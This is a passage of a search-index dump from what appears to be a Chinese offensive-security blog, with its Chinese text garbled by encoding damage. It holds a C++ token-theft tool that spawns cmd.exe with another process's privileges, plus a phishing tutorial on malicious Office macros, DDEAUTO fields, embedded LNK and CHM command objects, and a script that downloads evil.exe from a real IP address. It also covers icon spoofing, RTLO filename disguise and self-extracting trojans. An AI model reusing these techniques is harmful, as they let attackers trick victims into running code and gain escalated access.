(!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;Luid)) &#123; std::cout &lt;&lt; &quot;LookupPrivilegeValue ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; return false; &#125; tp.Privileges[0].Luid &#x3D; Luid; if (!AdjustTokenPrivileges(Token, FALSE, &amp;tp, sizeof(tp), NULL, NULL) )&#123; std::cout &lt;&lt; &quot;AdjustTokenPrivileges ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; return false; &#125; if (GetLastError() &#x3D;&#x3D; ERROR_NOT_ALL_ASSIGNED) &#123; return false; &#125; else &#123; return true; &#125;&#125;int main(int argc, char* argv[]) &#123; HANDLE t_process; HANDLE token &#x3D; NULL; HANDLE token_bak &#x3D; NULL; DWORD process_id; sscanf_s(argv[1], &quot;%ul&quot;, &amp;process_id); WCHAR command[] &#x3D; L&quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;; STARTUPINFO startupInfo; PROCESS_INFORMATION processInformation; ZeroMemory(&amp;startupInfo, sizeof(STARTUPINFO)); ZeroMemory(&amp;processInformation, sizeof(PROCESS_INFORMATION)); startupInfo.cb &#x3D; sizeof(STARTUPINFO); std::cout &lt;&lt; argv[1] &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Openning process PID:&quot; &lt;&lt; process_id &lt;&lt; std::endl; if (GetDebugPriv()&#x3D;&#x3D; TRUE) &#123; std::cout &lt;&lt; &quot;Got the debug priv&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;GetDebugPriv ERROR&quot; &lt;&lt; std::endl; &#125; system(&quot;whoami &#x2F;priv&quot;); t_process &#x3D; OpenProcess(PROCESS_ALL_ACCESS, true, process_id); if (!t_process) &#123; std::cout &lt;&lt; &quot;OpenProcess ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; if (!OpenProcessToken(t_process, TOKEN_ALL_ACCESS, &amp;token)) &#123; std::cout &lt;&lt; &quot;OpenProcessToken ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;token_bak)) &#123; std::cout &lt;&lt; &quot;DuplicateTokenEx ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; if (!CreateProcessWithTokenW(token_bak, LOGON_WITH_PROFILE, NULL, command, 0, NULL, NULL, &amp;startupInfo, &amp;processInformation)) &#123; std::cout &lt;&lt; &quot;CreateProcessWithTokenW ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; &#125; return 0;&#125; è¿™æ˜¯åœ¨win7ä¸‹çš„æµ‹è¯•ç»“æœ const\\administrator æ˜¯åŸŸæ§","categories":[],"tags":[{"name":"ææƒ","slug":"ææƒ","permalink":"http://const27.com/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"å‹é“¾","slug":"å‹é“¾","date":"2021-02-19T09:11:57.000Z","updated":"2021-03-23T16:50:22.917Z","comments":true,"path":"2021/02/19/å‹é“¾/","link":"","permalink":"http://const27.com/2021/02/19/%E5%8F%8B%E9%93%BE/","excerpt":"","text":"http://www.cl4y.top cl4y https://ljahum.github.io/ ljahum https://absolute-field.github.io absolute-field http://lola39.cn/ lola39 www.0xfay.github.io Fay 0xc4m3l.club 0xc4m3l www.afkl.ml AFKL http://39.106.144.160 x1hy9 http://106.75.101.193/ è¿·å¦¹ http://alanlitl.icu/ é¾™å“¥ www.kodosan.com ç¨‹å“¥ https://ha1c9on.top ha1c9onå¸ˆå‚… www.neorah.me neoå§ qingshan.cool åŠ²å® https://f4de-bak.github.io/ é˜¿ä¼Ÿ","categories":[],"tags":[{"name":"æ‚","slug":"æ‚","permalink":"http://const27.com/tags/%E6%9D%82/"}]},{"title":"é’“é±¼æŠ€æœ¯","slug":"é’“é±¼æŠ€å·§","date":"2021-02-19T08:07:56.000Z","updated":"2021-05-23T06:44:14.121Z","comments":true,"path":"2021/02/19/é’“é±¼æŠ€å·§/","link":"","permalink":"http://const27.com/2021/02/19/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/","excerpt":"","text":"OFFICEOfficeå®‰å…¨ä¿æŠ¤æœºåˆ¶å—ä¿æŠ¤çš„è§†å›¾ä¸ºäº†ä¿æŠ¤è®¡ç®—æœºä¸å—officeç—…æ¯’ä¾µå®³ï¼Œå¾®è½¯è®¾è®¡äº†ä¸€ä¸ªæ”¶ä¿æŠ¤è§†å›¾ï¼Œå°†æ‰€æœ‰å¯ç–‘çš„officeæ–‡ä»¶ä»¥åªè¯»æ–¹å¼æ‰“å¼€ï¼Œåœ¨è¯¥æ¨¡å¼ä¸‹å¤šæ•°ç¼–è¾‘åŠŸèƒ½è¢«ç¦ç”¨ã€‚æ–‡ä»¶å‘—ä»¥å—ä¿æŠ¤è§†å›¾æ‰“å¼€çš„æƒ…å†µæœ‰å¦‚ä¸‹å‡ ç§ æ–‡ä»¶æ˜¯ä» Internet ä½ç½®æ‰“å¼€çš„ æ–‡ä»¶æ˜¯é€šè¿‡ Outlook é™„ä»¶çš„æ–¹å¼æ¥æ”¶çš„ï¼Œå¹¶ä¸”è®¡ç®—æœºç­–ç•¥å°†å‘ä»¶äººå®šä¹‰ä¸ºä¸å®‰å…¨ æ–‡ä»¶æ˜¯ä»ä¸å®‰å…¨çš„ä½ç½®æ‰“å¼€çš„æ–‡ä»¶è¢«æ–‡ä»¶å—é˜»æ­¢æ–‡ä»¶éªŒè¯å¤±è´¥æ–‡ä»¶æ˜¯ä½¿ç”¨â€œåœ¨å—ä¿æŠ¤çš„è§†å›¾ä¸­æ‰“å¼€â€é€‰é¡¹æ‰“å¼€çš„ æ–‡ä»¶æ˜¯ä»å…¶ä»–äººçš„ OneDrive å­˜å‚¨ä¸­æ‰“å¼€çš„ XLM / Macro 4.0 ï¼ˆexcelå®é’“é±¼ï¼‰excelä¸‹æœ‰å®åŠŸèƒ½ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡Œå‘½ä»¤ã€‚å…¶ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ å³é”®ä¸‹æ–¹sheet1ï¼Œé€‰æ‹©æ’å…¥ ç‚¹å‡» MS Excel4.0å®è¡¨ï¼Œå°±å¯åœ¨excelä¸­æ’å…¥ä¸€ä¸ªå®è¡¨ä¾æ¬¡è¾“å…¥è¿™ä¸¤ä¸ªå‘½ä»¤ï¼Œå¹¶æŠŠç¬¬ä¸€è¡Œè®¾ç½®ä¸ºAuto_Open éšåä¿å­˜ä¸ºxlsmæ–‡ä»¶å³å¯ã€‚éšåå½“è¯¥æ–‡ä»¶è¢«æ‰“å¼€æ—¶ï¼Œä¼šè‡ªåŠ¨æ‰“å¼€cmdçª—å£ è¿™é‡Œçš„execå…¶å®æ˜¯æ‰§è¡Œçš„cmdå‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥å€Ÿæ­¤æ¥ä¸Šçº¿csç­‰æ“ä½œã€‚ çœŸä¸é”™ã€‚ä½†åœ¨æŸäº›æƒ…å†µä¸‹æ‰“å¼€æ­¤ç±»excelæ–‡ä»¶éœ€æ‰‹åŠ¨ç‚¹å‡»å¯ç”¨å®æ‰èƒ½æ­£å¸¸é’“é±¼ã€‚ Wordå®æ–°å»ºä¸€ä¸ªwordæ–‡ä»¶ï¼Œè¿›å…¥å®é€‰é¡¹ï¼ˆå¦‚æœæ²¡æœ‰è¯·è‡ªè¡Œåœ¨å¼€å‘è€…å·¥å…·é‡Œå¼€å¯ ç„¶åéšä¾¿è¾“AutoOpen(æ–‡ä»¶æ‰“å¼€æ—¶è‡ªåŠ¨æ‰§è¡Œå®)ï¼Œåˆ›å»ºï¼Œæ³¨æ„å®çš„ä½ç½®è¦æŒ‡å®šä¸ºå½“å‰æ–‡æ¡£ ç„¶åè¿›å…¥å®ç¼–è¾‘æ¡† è¾“å…¥ä»¥ä¸‹å‘½ä»¤ Sub AutoOpen()Shell (&quot;calc&quot;) &#x2F;&#x2F;åªéœ€è¦å†™è¿™ä¸ªå°±è¡Œäº†End Sub AutoExecï¼šå¯åŠ¨ Word æˆ–åŠ è½½å…¨å±€æ¨¡æ¿æ—¶AutoNewï¼šæ¯æ¬¡æ–°å»ºæ–‡æ¡£æ—¶AutoOpenï¼šæ¯æ¬¡æ‰“å¼€å·²æœ‰æ–‡æ¡£æ—¶AutoCloseï¼šæ¯æ¬¡å…³é—­æ–‡æ¡£æ—¶AutoExitï¼šé€€å‡º Word æˆ–å¸è½½å…¨å±€æ¨¡æ¿æ—¶ ä¿å­˜ä¸ºdocmï¼ˆå¯ç”¨å®çš„wordæ–‡æ¡£ï¼‰ æ‰“å¼€æ–‡ä»¶ï¼Œå°±è¹¦å‡ºè®¡ç®—å™¨äº†ã€‚ï¼ˆå‰ææ˜¯åœ¨ä¿¡ä»»ä¸­å¿ƒè®¾ç½®å¼€å¯æ‰€æœ‰å®ï¼‰å½“ç„¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ‰“å¼€æ­¤ç±»æ–‡ä»¶ä¼šæ˜¾ç¤º å¯ç”¨å†…å®¹åå°±ä¼šå¼¹è®¡ç®—å™¨äº† Word DDEåœ¨wordæ–‡ä»¶é‡Œï¼Œè¾“å…¥ ctrl+F9,è¿›å…¥åˆ°åŸŸä»£ç ç¼–è¾‘ã€‚æˆ‘ä»¬å¯ä»¥é”®å…¥ä»¥ä¸‹ä»£ç ä½¿æ–‡ä»¶åœ¨è¢«æ‰“å¼€æ—¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆword2019å¤ç°æœªæˆåŠŸï¼Œword2016æˆåŠŸï¼Œä¼¼ä¹æ˜¯wordç‰ˆæœ¬é—®é¢˜è¿™ä¸ªè›®å®ç”¨çš„ï¼Œç›®å‰ä¼—å¤šwordæ˜¯é»˜è®¤ç¦ç”¨å®çš„ï¼Œddeåªéœ€è¦ç”¨æˆ·ç‚¹å‡»ä¸¤ä¸ªæŒ‰é’®å³å¯æ‰§è¡Œï¼Œå®ç”¨æ€§æ¯”å®å¥½ DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe &quot;&#x2F;k calc.exe&quot; éšååœ¨æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ä¼šå‡ºç°ä¸¤ä¸ªå¯¹è¯æ¡†ï¼Œå…¨ç‚¹æ˜¯å°±ä¼šæ‰§è¡Œä»¥ä¸Šå‘½ä»¤äº† office OLE+LNKæ ¸å¿ƒç›®æ ‡æ˜¯åˆ›å»ºä¸€ä¸ªå†…åµŒçš„lnkæ–‡ä»¶è¯±å¯¼ç”¨æˆ·ç‚¹å‡»ï¼Œä»è€Œæ‰§è¡Œå‘½ä»¤ã€‚wordï¼Œexceléƒ½èƒ½ä½¿ç”¨ æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå¿«æ·æ–¹å¼å¦‚ä¸‹ å…¶ç›®æ ‡å¤„å¡«å†™çš„æ˜¯ %SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command calc ç„¶åæ‰“å¼€wordæ–‡ä»¶ï¼Œæ’å…¥å¯¹è±¡ï¼Œé€‰æ‹©packageï¼Œä¸ºäº†æ›´åŠ é€¼çœŸå‹¾é€‰æ˜¾ç¤ºä¸ºå›¾æ ‡ï¼Œç„¶åå¯ä»¥æ›´æ”¹å›¾æ ‡ï¼Œæˆ‘ä»¬åœ¨æ›´æ”¹å›¾æ ‡å¤„é€‰æ‹©ä¸€ä¸ªè¿·æƒ‘æ€§æ¯”è¾ƒå¤§çš„å›¾æ ‡ ç„¶åè¿›å…¥åˆ›å»ºè½¯ä»¶åŒ…ç•Œé¢ï¼Œé€‰æ‹©æˆ‘ä»¬åˆšåˆšåˆ›å»ºçš„lnkæ–‡ä»¶ï¼Œå†™å¥½å·æ ‡åï¼Œç„¶åå°±æŠŠè½¯ä»¶åŒ…æ’å…¥åˆ°wordç•Œé¢äº†ï¼Œåªè¦ç”¨æˆ·ç‚¹å‡»è¯¥è½¯ä»¶åŒ…å¹¶é€‰æ‹©æ‰§è¡Œï¼Œåˆ™ä¼šæ‰§è¡Œæˆ‘ä»¬åœ¨lnkä¸­å®šä¹‰çš„ä»£ç  è€Œä¸”å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¦‚æœç”¨ä¸Šè¿°æ–¹æ³•æŠŠlnkæ–‡ä»¶æ”¾å…¥publisheræ–‡ä»¶ï¼Œåˆ™åœ¨ç½‘ç»œä¸­æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ä¸ä¼šè§¦å‘å—ä¿æŠ¤è§†å›¾ã€‚ï¼ˆå¯èƒ½æ˜¯æˆ‘æœ¬åœ°ç¯å¢ƒæœ‰ç‚¹é”™ï¼Ÿæˆ‘è§‰å¾—è¿™ä¸ªæœ‰ç‚¹ç¦»è°± åµŒå…¥jså…ƒç´ è¿™ä¸ªè¯´å®è¯éœ€è¦ä¸€ç‚¹jsåŠŸåº•ã€‚ã€‚è¿™ä¸ªæ–¹å¼çš„åŸç†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å¾€wordä¸­æ’å…¥è”æœºè§†é¢‘ï¼Œé‚£ä¹ˆå†wordçš„å‹ç¼©åŒ… word/document.xmlé‡Œçš„embeddedHtmlé¡¹ä¸­ä¼šå‡ºç°è”æœºè§†é¢‘å¯¹åº”çš„å†…åµŒhtmlä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹è¿™äº›ä»£ç ï¼Œæ’å…¥æ¶æ„jsä»£ç ã€‚ ä¸€èˆ¬çš„åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡jsä¸‹è½½æ¶æ„æ–‡ä»¶ï¼Œä½†æ˜¯ä¼¼ä¹æ˜¯å› ä¸ºwordçš„ä¸€äº›ä¿æŠ¤æœºåˆ¶ï¼Œä¸èƒ½å®ç°é¡µé¢è·³è½¬æˆ–è€…è‡ªåŠ¨ç‚¹å‡»ä¸‹è½½ç­‰æ“ä½œ(æ‰“å¼€wordæ–‡ä»¶ä¼šæŠ¥é”™),å¥½è¿· &lt;html&gt;&lt;body&gt;&lt;script&gt; var a &#x3D; document.createElement(&#39;a&#39;); console.log(a); document.body.appendChild(a); a.style &#x3D; &#39;display: none&#39;; a.href &#x3D; &quot;http:&#x2F;&#x2F;149.129.64.180&#x2F;evil.exe&quot;; &#x2F;&#x2F;è¯¥è¡Œè‹¥å­˜åœ¨ï¼Œæ‰“å¼€wordæ–‡ä»¶ä¼šæŠ¥é”™ a.download &#x3D; fileName; window.URL.revokeObjectURL(url);&lt;&#x2F;script&gt;&lt;script&gt; a.click();&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; æˆ‘çœ‹äº†ä¸€ä¸ªPOCï¼Œé‡Œé¢æ˜¯é€šè¿‡æ„é€ äºŒè¿›åˆ¶æ•°æ®äº¤ç»™BLOBå¯¹è±¡å¤„ç†ï¼Œå¹¶è‡ªåŠ¨ç‚¹å‡»ç”±BLOBå¯¹è±¡ç”Ÿæˆçš„urlå®ç°ä¸‹è½½äºŒè¿›åˆ¶æ•°æ®ï¼Œè€Œè¿™äº›äºŒè¿›åˆ¶æ•°æ®å®è´¨ä¸Šæ˜¯æ¶æ„æ–‡ä»¶ã€‚ å› ä¸ºæˆ‘æä¸æ¥é‚£ä¸ªäºŒè¿›åˆ¶æ•°æ®æ€ä¹ˆäº§ç”Ÿï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æš‚æ—¶åªåšäº†è§£å§ã€‚ã€‚è€Œä¸”æˆ‘çœ‹çš„é‚£ä¸ªæ–‡ç« çš„POCåœ¨æˆ‘çš„word2016é‡Œä¸èƒ½æ­£å¸¸å·¥ä½œï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› reference:https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-replacing-embedded-video-with-bogus-payload åˆ©ç”¨æ¨¡æ¿æ–‡ä»¶æ³¨å…¥å®æŒ‡ä»¤åŸç†æ˜¯ï¼Œå…ˆåˆ›å»ºä¸€ä¸ªå¸¦æ¨¡æ¿çš„æ–‡æ¡£ï¼Œå†åˆ›ä¸€ä¸ªå¯ç”¨å®çš„æ¨¡æ¿æ–‡ä»¶ã€‚ç„¶ååœ¨å¸¦æ¨¡æ¿çš„æ–‡æ¡£çš„å‹ç¼©åŒ…é‡Œé¢ä¿®æ”¹ä¸€äº›å†…å®¹ï¼Œä½¿å…¶æŒ‡å‘çš„æ¨¡æ¿ä¿®æ”¹ä¸ºæˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„æ¨¡æ¿æ–‡ä»¶ï¼Œè¿™ä¹‹é—´çš„è¿‡ç¨‹å¯ä»¥ç”±smbåè®®å®Œæˆï¼Œæ•…è¿‡æŸ¥æ€å‡ ç‡è¾ƒé«˜ã€‚ æˆ‘ä»¬åœ¨å¯ç”¨å®çš„æ¨¡æ¿æ–‡ä»¶ï¼ˆdoc3.dotm)é‡Œå†™å…¥å®ã€‚ Sub AutoOpen()Shell &quot;calc&quot;End Sub CHM ç”µå­ä¹¦æ–°å»ºä¸€ä¸ªhtmlæ–‡ä»¶ï¼Œç¼–ç æ ¼å¼ANSIï¼Œå‘é‡Œé¢å†™å…¥å¦‚ä¸‹å†…å®¹ &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;&#x2F;title&gt;&lt;head&gt;&lt;&#x2F;head&gt;&lt;body&gt;command exec &lt;OBJECT id&#x3D;x classid&#x3D;&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width&#x3D;1 height&#x3D;1&gt;&lt;PARAM name&#x3D;&quot;Command&quot; value&#x3D;&quot;ShortCut&quot;&gt; &lt;PARAM name&#x3D;&quot;Button&quot; value&#x3D;&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&#39;,cmd.exe,&#x2F;c calc.exe&#39;&gt; &#x2F;&#x2F;è¿™ä¸€æ’ç”¨äºæ‰§è¡Œå‘½ä»¤ï¼Œæ³¨æ„cmd.exeå‰åéƒ½æœ‰,æˆ–è€…&lt;PARAM name&#x3D;&quot;Item1&quot; value&#x3D;&#39;,powershell.exe,-c calc.exe&#39;&gt;ä¹Ÿè¡Œ &lt;PARAM name&#x3D;&quot;Item2&quot; value&#x3D;&quot;273,1,1&quot;&gt;&lt;&#x2F;OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;&#x2F;SCRIPT&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; ç”¨easychmï¼Œæ–°å»º-æµè§ˆ-é€‰æ‹©htmlæ–‡ä»¶æ‰€åœ¨ç›®å½•-é€‰æ‹©htmlæ–‡ä»¶-ç¼–è¯‘ ç”Ÿæˆä¸€ä¸ªchmï¼ŒåŒå‡»ï¼Œæ‰“å¼€äº†è®¡ç®—å™¨ å›¾æ ‡æ›¿æ¢ä½¿ç”¨Restoratorï¼Œæ‰“å¼€éœ€è¦æ›¿æ¢å›¾æ ‡çš„exeï¼Œæä¾›å›¾æ ‡çš„exeï¼Œå¦‚ä¸‹ å³é”®main.exe,æ·»åŠ èµ„æºï¼Œå›¾æ ‡ï¼Œidé€‰æ‹©127.éšåå³é”®Listary.exe/å›¾æ ‡/127 å¯¼å‡ºï¼Œå°†å…¶å¯¼å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹ç„¶åå³é”®main.exe/å›¾æ ‡ï¼Œå¯¼å…¥ï¼Œé€‰æ‹©åˆšåˆšå¯¼å‡ºå›¾æ ‡çš„æ–‡ä»¶å¤¹ï¼Œç¡®å®š,ctrl+ä¿å­˜ RTLO ç»§ç»­é‡å‘½åï¼Œåœ¨aåé¢å³é”®ï¼Œæ’å…¥Unicodeæ§åˆ¶å­—ç¬¦-&gt;RLO rarè§£å‹è‡ªè¿è¡Œæœ¨é©¬æ–‡ä»¶:artifact.exe è¿·æƒ‘æ–‡ä»¶:calc.exeè¿›å…¥winrarï¼Œé€‰ä¸­è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œå³é”®æ·»åŠ è‡³å‹ç¼©åŒ….åˆ›å»ºè‡ªè§£å‹æ ¼å¼å‹ç¼©æ–‡ä»¶ é«˜çº§-&gt;è‡ªè§£å‹é€‰é¡¹-&gt;è®¾ç½® æ¨¡å¼-&gt;å…¨éƒ¨éšè— æ›´æ–°-&gt;è§£å‹å¹¶æ›´æ–°æ–‡ä»¶,è¦†ç›–æ‰€æœ‰æ–‡ä»¶ ç”Ÿæˆ,åŒå‡»è¿è¡Œ","categories":[],"tags":[{"name":"é’“é±¼","slug":"é’“é±¼","permalink":"http://const27.com/tags/%E9%92%93%E9%B1%BC/"}]}],"categories":[],"tags":[{"name":"ä¸€äº›åº”ç”¨çš„æ”»å‡»æ–¹å¼","slug":"ä¸€äº›åº”ç”¨çš„æ”»å‡»æ–¹å¼","permalink":"http://const27.com/tags/%E4%B8%80%E4%BA%9B%E5%BA%94%E7%94%A8%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"},{"name":"javaå¼€å‘ä¸å®‰å…¨","slug":"javaå¼€å‘ä¸å®‰å…¨","permalink":"http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"},{"name":"ç³»ç»Ÿç›¸å…³ä¸å…æ€","slug":"ç³»ç»Ÿç›¸å…³ä¸å…æ€","permalink":"http://const27.com/tags/%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%E4%B8%8E%E5%85%8D%E6%9D%80/"},{"name":"å†…ç½‘æ¸—é€ä¸æƒé™ç»´æŒ","slug":"å†…ç½‘æ¸—é€ä¸æƒé™ç»´æŒ","permalink":"http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"name":"æ‚ä¸ƒæ‚å…«çš„å®‰å…¨é—®é¢˜","slug":"æ‚ä¸ƒæ‚å…«çš„å®‰å…¨é—®é¢˜","permalink":"http://const27.com/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"},{"name":"ä¸­é—´ä»¶å®‰å…¨","slug":"ä¸­é—´ä»¶å®‰å…¨","permalink":"http://const27.com/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/"},{"name":"å¤–å›´æ‰“ç‚¹","slug":"å¤–å›´æ‰“ç‚¹","permalink":"http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"},{"name":"ææƒ","slug":"ææƒ","permalink":"http://const27.com/tags/%E6%8F%90%E6%9D%83/"},{"name":"æ‚","slug":"æ‚","permalink":"http://const27.com/tags/%E6%9D%82/"},{"name":"é’“é±¼","slug":"é’“é±¼","permalink":"http://const27.com/tags/%E9%92%93%E9%B1%BC/"}]}